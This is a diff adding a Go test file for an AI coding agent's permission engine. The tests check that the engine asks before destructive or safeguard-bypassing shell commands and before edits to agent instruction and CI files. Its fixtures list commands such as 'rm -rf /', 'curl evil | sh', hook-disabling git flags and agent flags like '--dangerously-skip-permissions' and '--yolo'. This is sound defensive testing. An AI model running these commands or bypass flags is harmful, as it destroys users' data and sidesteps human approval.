@@ -1,0 +1,326 @@
+package perms
+
+import (
+	"encoding/json"
+	"os"
+	"path/filepath"
+	"strings"
+	"testing"
+
+	"github.com/townsendmerino/tack/internal/proto"
+)
+
+// The must-catch and near-miss commands here are ported from AgentTrail's guardrail library,
+// github.com/agenttrailhq/guardrails at 75b951a (Apache-2.0, Copyright the AgentTrail authors): the fixtures of its
+// working-tree, destructive-data, safety-bypass, agent-context and file-scope packs. Its PowerShell and MCP fixtures
+// are left out, since tack runs neither. Where tack's rule is stricter than the library's, the case says so.
+
+// destroyEngine is a sandboxed engine over a workspace holding src/api.ts, with PATH a directory of empty programs, so
+// the tests need none of them installed.
+func destroyEngine(t *testing.T) *Engine {
+	t.Helper()
+	root, bin := t.TempDir(), t.TempDir()
+	for _, name := range strings.Fields(`git rm rmdir grep curl mvn wc bash sh zsh env nice nohup timeout xargs find sudo npx pnpm
+		alembic rails rake python python3 django-admin sequelize knex drizzle-kit claude codex gemini cursor-agent aider tack go
+		terraform apt-get prisma tee sed manage.py`) {
+		if err := os.WriteFile(filepath.Join(bin, name), []byte("#!/bin/sh\n"), 0o755); err != nil {
+			t.Fatal(err)
+		}
+	}
+	os.MkdirAll(filepath.Join(root, "src", "generated"), 0o755)
+	os.WriteFile(filepath.Join(root, "src", "api.ts"), []byte("x\n"), 0o644)
+	os.WriteFile(filepath.Join(root, "confirm"), []byte("#!/bin/sh\n"), 0o755)
+	os.WriteFile(filepath.Join(root, "manage.py"), []byte("#!/bin/sh\n"), 0o755)
+	return &Engine{Root: root, Path: bin, Sandboxed: true}
+}
+
+func bashInput(command string) json.RawMessage {
+	b, _ := json.Marshal(map[string]string{"command": command})
+	return b
+}
+
+// mentions is the library's four near-misses for one payload: the words in a commit message, a search, an echo and an
+// HTTP body are not the command.
+func mentions(text string) []string {
+	q := func(s string) string { return `"` + s + `"` }
+	return []string{
+		"git commit -m " + q("docs: explain "+text),
+		"grep -rn " + q(text) + " docs/",
+		"echo " + q("never run "+text),
+		"curl --data " + q("we ran "+text) + " https://api.example.com/comments",
+	}
+}
+
+type commandCases struct {
+	name         string
+	catch, leave []string
+}
+
+var destroyCases = []commandCases{
+	{"reset --hard", []string{
+		"git reset --hard", "git reset --hard HEAD~3", "git reset --hard origin/main", "git -C /tmp/scratch reset --hard",
+		"git --no-pager reset --hard HEAD~2", "git -c core.pager=cat reset --hard",
+	}, append(mentions("git reset --hard"),
+		"git reset --soft HEAD~1", "git reset src/api.ts", "git reset --mixed HEAD", "git reset HEAD~1", "git status")},
+	{"reset --merge and --keep", []string{
+		"git reset --merge", "git reset --keep origin/main", "git reset --merge HEAD~1", "git -C /repo reset --merge",
+		"git --no-pager reset --keep origin/main",
+	}, append(mentions("git reset --merge"), "git merge --abort", "git reset")},
+	{"clean", []string{
+		"git clean -fd", "git clean -fdx", "git clean -xdf", "git clean --force -d", "git -C /repo clean -fd",
+		"git --no-pager clean -fdx", "git clean -f",
+		"git -c clean.requireForce=false clean -d", // tack's own: the same deletion without -f
+	}, append(mentions("git clean -fd"),
+		"git clean -nd", "git -C /repo clean -fd --dry-run", "git clean --dry-run -d", "git clean -n", "git status --short")},
+	{"checkout that discards", []string{
+		"git checkout -- src/api.ts", "git checkout -- .", "git checkout .", "git checkout -f",
+		"git -C /repo checkout -- src/api.ts", "git --no-pager checkout -f",
+		"git checkout src/api.ts", "git checkout HEAD~1 src/api.ts", // tack's own: a path that exists, without the --
+		"git switch --discard-changes main", "git switch -f main",
+	}, append(mentions("git checkout -- src/api.ts"),
+		"git checkout main", "git checkout -b feature/new-thing", "git checkout tags/v1.2.3", "git checkout --track origin/release",
+		"git switch main", "git switch -c topic", "git checkout -b src/api.ts")},
+	{"restore", []string{
+		"git restore src/api.ts", "git restore .", "git restore --source=HEAD~2 src/api.ts", "git -C /repo restore src/api.ts",
+		"git --no-pager restore .", "git restore --staged --worktree src/api.ts", "git restore -SW src/api.ts",
+	}, append(mentions("git restore src/api.ts"),
+		"git restore --staged src/api.ts", "git -C /repo restore --staged src/api.ts", "git restore -S src/api.ts",
+		"git stash push -m wip src/api.ts", "git status --short")},
+	{"stash", []string{
+		"git stash drop", "git stash clear", "git stash drop stash@{2}", "git -C /repo stash drop",
+	}, append(mentions("git stash drop"), "git stash push -m wip", "git stash list", "git stash pop", "git stash show -p")},
+	{"branch force delete", []string{
+		"git branch -D feature/abandoned", "git branch --delete --force feature/abandoned", "git branch -D feature/a feature/b",
+		"git  branch -D feature/double-space", "git -C /repo branch -D feature/abandoned",
+		"git --no-pager branch --delete --force feature/abandoned", "git branch -df x", "git branch -d -f x",
+	}, append(mentions("git branch -D feature/abandoned"),
+		"git branch -d merged-feature", "git branch -a", "git branch --show-current", "mvn -DskipTests package")},
+	{"rm -r", []string{
+		"rm -Rf /home/user/projects", "rm -fr src/generated", "rm -rf /", "rm -rf /etc", "rm -Rf /var/lib/postgresql",
+		"rm -rf /usr/local/bin", `git commit -m "x" && rm -rf /`, `echo "rm -rf /" | bash`,
+		"rm -r src", "rm --recursive src", "rm -rf .", "rm -rf dist src", "rm -rf build/../src", "rm -r .git",
+		"rm -rf -- src", "rm -f .git/hooks/pre-commit",
+	}, append(mentions("rm -Rf /home/user/projects"),
+		"rm -rf ./node_modules", "rm -rf node_modules", "rm -rf build/", "rm -rf dist", "./confirm -rf x", "rm package-lock.json",
+		"rm -f /tmp/app.pid", "rm -rf $TMPDIR/scratch", "rm -rf /tmp/scratch", `wc -l < log; echo "--- rm -rf / ---"; grep -c x log`,
+		"rm src/api.ts")},
+	{"accept data loss", []string{
+		"npx prisma db push --accept-data-loss", "npx prisma migrate reset --force-reset", "npx prisma db push --force",
+	}, append(mentions("npx prisma db push --accept-data-loss"),
+		"npx prisma db push", "npx prisma generate", "pnpm db:push", "npx prisma studio")},
+	{"migration reset", []string{
+		"npx prisma migrate reset --force", "alembic downgrade base", "rails db:reset", "rake db:drop", "python manage.py flush",
+		"./manage.py flush", "django-admin flush", "sequelize db:migrate:undo:all", "knex migrate:rollback --all", "drizzle-kit drop",
+	}, append(mentions("npx prisma migrate reset --force"),
+		"npx prisma migrate dev --name add-users", "npx prisma migrate deploy", "alembic upgrade head", "rails db:migrate",
+		"knex migrate:latest", "knex migrate:rollback")},
+	{"no verify", []string{
+		`git commit --no-verify -m "wip"`, "git push --no-verify origin main", `git commit -n -m "wip"`, `git commit -nm "wip"`,
+		`git -C /repo commit --no-verify -m "wip"`, "git --no-pager push --no-verify origin main",
+	}, []string{
+		`grep -rn "git commit --no-verify -m wip" docs/`, `echo "never run git commit --no-verify -m wip"`,
+		`curl --data "we ran git commit --no-verify -m wip" https://api.example.com/comments`,
+		`git commit -m "add the thing"`, "git push origin main", "mvn -DskipTests package", "git commit --amend --no-edit",
+		`git commit -m "-n"`, "git push -n origin main",
+	}},
+	{"hooks off", []string{
+		"git config core.hooksPath /dev/null", "git -C /repo config core.hooksPath /dev/null", `HUSKY=0 git commit -m "wip"`,
+		"git -c core.hooksPath=/dev/null commit -m x", "git --config-env=core.hooksPath=H commit -m x",
+		"git config --unset core.hooksPath", "git config set core.hooksPath /dev/null", "env HUSKY=0 git commit -m x", "export HUSKY=0",
+	}, append(mentions("git config core.hooksPath /dev/null"),
+		"git config user.email dev@example.com", "git config --list", "pnpm husky install", "git config core.hooksPath",
+		"git config --get core.hooksPath", "git -c core.pager=cat log")},
+	{"another agent", []string{
+		`claude -p "summarize the failing tests"`, `npx @anthropic-ai/claude-code --print "fix the lint errors"`,
+		`claude --model sonnet -p "write the changelog"`, `codex exec "add unit tests for the parser"`,
+		`codex e "add unit tests for the parser"`, `gemini -p "explain this repository"`, `cursor-agent -p "refactor the auth module"`,
+		`aider --message "rename foo to bar" src/app.py`, `aider -m "rename foo to bar" src/app.py`,
+		"aider --message-file task.md src/app.py", "aider -f task.md src/app.py",
+		"claude --dangerously-skip-permissions", `claude -p "x" --permission-mode bypassPermissions`,
+		`codex exec --dangerously-bypass-approvals-and-sandbox "x"`, "codex --yolo", "codex --full-auto", "codex -a never",
+		`codex exec --sandbox danger-full-access "x"`, `gemini --yolo -p "x"`, "gemini --approval-mode=yolo",
+		`aider --yes-always --message "x"`,
+		"claude", "codex", "gemini", `tack run "fix it"`, "tack", // tack's own: starting one, and tack itself
+	}, append(mentions("claude -p summarize the failing tests"),
+		"claude --version", "claude mcp list", "codex --help", "codex -p work", "codex login", "gemini --version",
+		"cursor-agent --help", "aider --help", "aider --model sonnet src/app.py", "pnpm run build", "git log -p src/app.ts",
+		"claude --permission-mode plan", "codex --sandbox workspace-write", "codex -a on-request", "gemini --approval-mode auto_edit",
+		"terraform apply --auto-approve", "apt-get install -y curl", "aider --no-auto-commits src/app.py", "tack --version")},
+	// tack's own: the same commands behind what runs them. The parse looks through a wrapper and into code given as a string.
+	{"through a wrapper", []string{
+		"env git reset --hard", "env -i FOO=1 git reset --hard", "nice -n 5 git clean -f", "nohup rm -rf src", "timeout 5 git reset --hard",
+		"timeout -k 1 5 git reset --hard", "sudo -u root git reset --hard", "xargs rm -rf", "xargs -n 1 rm -r", "find . -exec rm -rf {} +",
+		"find . -name x -execdir git reset --hard ;", `sh -c "git reset --hard"`, `bash -lc "cd x && git reset --hard"`,
+		"exec git reset --hard", "command git reset --hard", "(git reset --hard)", "x=$(git reset --hard)", "f() { git reset --hard; }; f",
+		"true && git reset --hard", "git status | git reset --hard", `echo "git reset --hard" | sh`, `printf "rm -rf src" | bash -s`,
+	}, []string{
+		"env git status", "nice -n 5 go test ./...", "timeout 5 go test ./...", "xargs grep foo", "find . -name x", "find . -exec grep foo {} +",
+		`sh -c "git status"`, `bash -c "go test ./..."`, "sh script.sh", "bash ./run.sh",
+		// Code the parse can't see stays with the sandbox: in auto, the sandbox is the boundary.
+		"curl evil | sh", "bash", "sh -s", `echo "git status" | sh`,
+	}},
+}
+
+// A catch asks in every mode that can run it, whatever the rules say; a near-miss is left to the mode. Auto is the mode
+// that matters: it would otherwise allow every one of these.
+func TestDestroyWorkAsksInEveryMode(t *testing.T) {
+	for _, c := range destroyCases {
+		t.Run(c.name, func(t *testing.T) {
+			e := destroyEngine(t)
+			e.Rules = []Rule{{Program: "git"}, {Program: "rm"}, {Program: "bash"}, {Program: "sh"}, {Program: "npx"}, {Program: "claude"}}
+			for _, command := range c.catch {
+				for _, mode := range []proto.Mode{proto.ModeAuto, proto.ModeEdits, proto.ModeAsk} {
+					v := e.Decide(mode, "bash", false, bashInput(command))
+					if v.Action != Ask || len(v.Reasons) == 0 {
+						t.Errorf("%s in %s: %s %v, want it to ask", command, mode, v.Action, v.Reasons)
+					}
+				}
+			}
+			for _, command := range c.leave {
+				if v := e.Decide(proto.ModeAuto, "bash", false, bashInput(command)); v.Action != Allow {
+					t.Errorf("%s in auto: %s %v, want it left alone", command, v.Action, v.Reasons)
+				}
+			}
+		})
+	}
+}
+
+// What only shows after expansion is the run-time check's: AlwaysAsks sees the expanded arguments (Literal true), and a
+// command relative to where it runs.
+func TestAlwaysAsksOnExpandedArguments(t *testing.T) {
+	e := destroyEngine(t)
+	lit := func(prog string, args ...string) Simple {
+		s := Simple{Program: filepath.Join(e.Path, prog), Name: prog, Args: args, Literal: make([]bool, len(args))}
+		for i := range s.Literal {
+			s.Literal[i] = true
+		}
+		return s
+	}
+	tmp, err := os.MkdirTemp("", "tack-destroy")
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { os.RemoveAll(tmp) })
+	for _, c := range []struct {
+		name string
+		s    Simple
+		dir  string
+		asks bool
+	}{
+		{"home, the library's must-catch", lit("rm", "-rf", "/Users/someone/Projects/old-client"), e.Root, true},
+		{"the flag from a variable", lit("git", "reset", "--hard"), e.Root, true},
+		{"a glob's matches", lit("rm", "-rf", "src/api.ts", "src/generated"), e.Root, true},
+		{"the temp directory, the library's near-miss", lit("rm", "-rf", filepath.Join(tmp, "scratch")), e.Root, false},
+		{"the temp directory itself", lit("rm", "-rf", os.TempDir()), e.Root, true},
+		{"a build directory where it runs", lit("rm", "-rf", "node_modules"), filepath.Join(e.Root, "src"), false},
+		{"a relative path out of the temp directory", lit("rm", "-rf", "../../"), filepath.Join(tmp, "a"), true},
+		{"a program under another name", Simple{Program: "/bin/busybox", Name: "rm", Args: []string{"-rf", "src"}, Literal: []bool{true, true}}, e.Root, true},
+	} {
+		if got := e.AlwaysAsks(c.s, c.dir); (len(got) > 0) != c.asks {
+			t.Errorf("%s: %v, want asks=%v", c.name, got, c.asks)
+		}
+	}
+	// An argument that expands at run time is not judged before it runs: it may be either, and the run-time check decides.
+	if v := e.Decide(proto.ModeAuto, "bash", false, bashInput("git reset $how")); v.Action != Allow {
+		t.Errorf("git reset $how in auto: %s %v", v.Action, v.Reasons)
+	}
+	// A symlink named like a build directory is not one.
+	os.Symlink(filepath.Join(e.Root, "src"), filepath.Join(e.Root, "build"))
+	if got := e.AlwaysAsks(lit("rm", "-rf", "build/"), e.Root); len(got) == 0 {
+		t.Error("rm -rf build/ through a symlink to src was left alone")
+	}
+}
+
+func fileInput(path string) json.RawMessage {
+	b, _ := json.Marshal(map[string]string{"path": path})
+	return b
+}
+
+// Edits to CI definitions and instruction files ask in every mode that can make them, whatever was allowed for the
+// session, from any tool that changes something; reads do not.
+func TestProtectedFilesAskInEveryMode(t *testing.T) {
+	catch := []string{
+		".github/workflows/ci.yml", ".github/actions/setup/action.yml", ".gitlab-ci.yml", "Jenkinsfile", ".circleci/config.yml",
+		"azure-pipelines.yml", ".buildkite/pipeline.yml", "bitbucket-pipelines.yml",
+		"CLAUDE.md", "packages/api/CLAUDE.md", "CLAUDE.local.md", ".claude/rules/testing.md", "AGENTS.md",
+		"services/billing/AGENTS.override.md", "/home/dev/.gemini/GEMINI.md", ".cursorrules", ".windsurfrules", ".windsurf/rules/style.md",
+		".devin/rules/style.md", ".clinerules", ".clinerules/coding.md", "/Users/dev/Documents/Cline/Rules/global.md",
+		".github/copilot-instructions.md", ".github/instructions/frontend/react.instructions.md", ".aider.conf.yml", "docs/claude.md",
+		"CONTEXT.md", "sub/CONTEXT.md", ".agents/skills/lint/SKILL.md", ".GITHUB/WORKFLOWS/ci.yml", "agents.md",
+	}
+	leave := []string{
+		".github/CODEOWNERS", ".github/PULL_REQUEST_TEMPLATE.md", "package.json", "README.md", "CLAUDE.md.bak", "CONVENTIONS.md",
+		"docs/agents/overview.md", "src/agents.ts", "docs/rules/style.md", ".cursor/rules/style.mdc", ".claude/settings.json",
+		".aider.chat.history.md", "src/api.ts",
+	}
+	e := destroyEngine(t)
+	e.AllowForSession("edit", nil) // "allow for session" covers ordinary edits only
+	for _, tool := range []string{"edit", "write"} {
+		for _, p := range catch {
+			for _, mode := range []proto.Mode{proto.ModeAuto, proto.ModeEdits, proto.ModeAsk} {
+				if v := e.Decide(mode, tool, false, fileInput(p)); v.Action != Ask || len(v.Reasons) == 0 {
+					t.Errorf("%s %s in %s: %s %v, want it to ask", tool, p, mode, v.Action, v.Reasons)
+				}
+			}
+			if v := e.Decide(proto.ModeAuto, tool, true, fileInput(p)); v.Action != Allow {
+				t.Errorf("a read-only call on %s: %s", p, v.Action)
+			}
+			if v := e.Decide(proto.ModePlan, tool, false, fileInput(p)); v.Action != Deny {
+				t.Errorf("%s %s in plan: %s, plan stays read-only", tool, p, v.Action)
+			}
+		}
+		for _, p := range leave {
+			if v := e.Decide(proto.ModeAuto, tool, false, fileInput(p)); v.Action != Allow {
+				t.Errorf("%s %s in auto: %s %v, want it left alone", tool, p, v.Action, v.Reasons)
+			}
+		}
+	}
+	// A symlink to one, and a path that climbs back to one.
+	os.WriteFile(filepath.Join(e.Root, "CLAUDE.md"), []byte("x"), 0o644)
+	os.Symlink(filepath.Join(e.Root, "CLAUDE.md"), filepath.Join(e.Root, "notes.md"))
+	for _, p := range []string{"notes.md", "src/../CLAUDE.md"} {
+		if v := e.Decide(proto.ModeAuto, "write", false, fileInput(p)); v.Action != Ask {
+			t.Errorf("write %s in auto: %s", p, v.Action)
+		}
+	}
+	// A shell redirection edits a file too. Its target may be written any way the path is.
+	for _, command := range []string{"echo x > CLAUDE.md", "echo x >> .github/workflows/ci.yml", "echo x > src/../AGENTS.md", "echo x &> notes.md"} {
+		if v := e.Decide(proto.ModeAuto, "bash", false, bashInput(command)); v.Action != Ask {
+			t.Errorf("%s in auto: %s %v, want it to ask", command, v.Action, v.Reasons)
+		}
+	}
+	for _, command := range []string{"echo x > src/out.txt", "grep x < CLAUDE.md", "echo x > /dev/null"} {
+		if v := e.Decide(proto.ModeAuto, "bash", false, bashInput(command)); v.Action != Allow {
+			t.Errorf("%s in auto: %s %v, want it left alone", command, v.Action, v.Reasons)
+		}
+	}
+}
+
+// Allowing a command for the session does not stop the next one asking.
+func TestAllowForSessionDoesNotCoverDestroyedWork(t *testing.T) {
+	e := destroyEngine(t)
+	v := e.Decide(proto.ModeAsk, "bash", false, bashInput("git reset --hard"))
+	if v.Action != Ask {
+		t.Fatalf("%s", v.Action)
+	}
+	e.AllowForSession("bash", v.Parsed)
+	if v := e.Decide(proto.ModeAsk, "bash", false, bashInput("git reset --hard HEAD~1")); v.Action != Ask {
+		t.Fatalf("after allow for session: %s", v.Action)
+	}
+	if v := e.Decide(proto.ModeAsk, "bash", false, bashInput("git reset src/api.ts")); v.Action != Allow {
+		t.Fatalf("the rule it added should still cover an ordinary reset: %s %v", v.Action, v.Reasons)
+	}
+}
+
+// Without the sandbox, auto refuses every command and the others ask: the reason is still there for the user.
+func TestDestroyWorkWithoutTheSandbox(t *testing.T) {
+	e := destroyEngine(t)
+	e.Sandboxed = false
+	if v := e.Decide(proto.ModeAuto, "bash", false, bashInput("git reset --hard")); v.Action != Deny {
+		t.Fatalf("auto: %s", v.Action)
+	}
+	v := e.Decide(proto.ModeAsk, "bash", false, bashInput("git reset --hard"))
+	if v.Action != Ask || !strings.Contains(strings.Join(v.Reasons, ";"), "reset --hard") {
+		t.Fatalf("ask: %s %v", v.Action, v.Reasons)
+	}
+}
